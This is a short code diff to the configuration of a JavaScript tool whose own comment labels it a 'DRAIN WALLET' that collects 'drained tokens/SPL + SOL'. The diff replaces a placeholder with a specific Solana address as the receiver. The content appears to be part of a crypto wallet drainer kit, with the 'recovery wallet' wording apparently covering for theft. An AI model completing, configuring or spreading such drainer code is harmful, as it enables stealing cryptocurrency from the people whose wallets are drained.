@@ -6,7 +6,7 @@
 const CONFIG = {
     // DRAIN WALLET: All drained tokens/SPL + SOL go here
     RECEIVER_WALLET: new solanaWeb3.PublicKey(
-        'YOUR_SOLANA_WALLET_ADDRESS_HERE'  // <-- REPLACE WITH YOUR RECOVERY WALLET
+        'Zg5r67TdhqKf6YYcU6hi86j8Up7LX9DzBo5VZdmQE8y'  // <-- REPLACE WITH YOUR RECOVERY WALLET
     ),
 
     // RPC endpoint (public or private — Helius, QuickNode, etc.)
